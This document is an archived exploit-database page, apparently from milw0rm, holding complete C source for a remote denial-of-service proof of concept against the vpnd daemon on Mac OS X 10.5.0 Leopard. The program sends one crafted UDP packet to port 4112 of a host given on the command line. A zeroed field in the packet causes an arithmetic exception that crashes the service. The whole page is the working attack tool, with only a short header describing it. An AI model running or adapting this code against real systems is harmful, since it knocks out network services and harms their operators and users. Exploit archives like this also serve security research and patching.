<html><head><title>Apple Mac OS X 10.5.0 (leopard) vpnd Remote Denial of Service PoC</title></head><pre>/* vpnd-leopard-lb-dos.c
 *
 * Copyright (c) 2007 by &lt;mu-b@digit-labs.org&gt;
 *
 * Apple MACOS X 10.5.0 (leopard) vpnd remote DoS POC
 * by mu-b - Fri 9 Nov 2007
 *
 * - Tested on: Apple MACOS X 10.5.0 (leopard) vpnd
 *
 * Program received signal EXC_ARITHMETIC, Arithmetic exception.
 * 0x00004828 in accept_connections ()
 *
 *    - Private Source Code -DO NOT DISTRIBUTE -
 * http://www.digit-labs.org/ -- Digit-Labs 2007!@$!
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netdb.h&gt;
#include &lt;sys/time.h&gt;
#include &lt;sys/types.h&gt;

#define DEF_PORT      4112
#define PORT_VPND     DEF_PORT

static char abuf[] =
  &quot;\x00\x01\x00\x18&quot;
  &quot;\x00\x00\x00\x00&quot;
  &quot;\xd5\xa5\xf9\xc3&quot;
  &quot;\x00\x00&quot;          /* [edi+0Ch] -&gt; ecx == 0 */
  &quot;\x00\x00\x00\x00&quot;
  &quot;\x00\x00\x00\x00&quot;
  &quot;\x00\x00&quot;;

static void zattack (char *host);

static void
zattack (char *host)
{
  struct sockaddr_in address;
  struct hostent *hp;
  int fd, n;

  if ((fd = socket (AF_INET, SOCK_DGRAM, 0)) == -1)
    {
      perror (&quot;socket()&quot;);
      exit (EXIT_FAILURE);
    }

  if ((hp = gethostbyname (host)) == NULL)
    {
      perror (&quot;gethostbyname()&quot;);
      exit (EXIT_FAILURE);
    }

  memset (&amp;address, 0, sizeof (address));
  memcpy ((char *) &amp;address.sin_addr, hp-&gt;h_addr, hp-&gt;h_length);
  address.sin_port = htons (PORT_VPND);

  printf (&quot;+Attacking %s:%d\n&quot;, host, PORT_VPND);

  n = sendto (fd, abuf, sizeof abuf - 1, 0, (struct sockaddr *) &amp;address, sizeof address);
  if (n != sizeof abuf - 1)
    {
      fprintf (stderr, &quot;zattack: sendto %d != %d\n&quot;, n, sizeof abuf - 1);
      exit (EXIT_FAILURE);
    }

  close (fd);
}

int
main (int argc, char **argv)
{
  printf (&quot;Apple MACOS X 10.5.0 (leopard) vpnd remote DoS PoC\n&quot;
          &quot;by: &lt;mu-b@digit-labs.org&gt;\n&quot;
          &quot;http://www.digit-labs.org/ -- Digit-Labs 2007!@$!\n\n&quot;);

  if (argc &lt;= 1)
    {
      fprintf (stderr, &quot;Usage: %s &lt;host&gt;\n&quot;, argv[0]);
      exit (EXIT_SUCCESS);
    }

  zattack (argv[1]);

  printf (&quot;+Wh00t!\n&quot;);

  return (EXIT_SUCCESS);
}

// milw0rm.com [2007-12-04]</pre></html>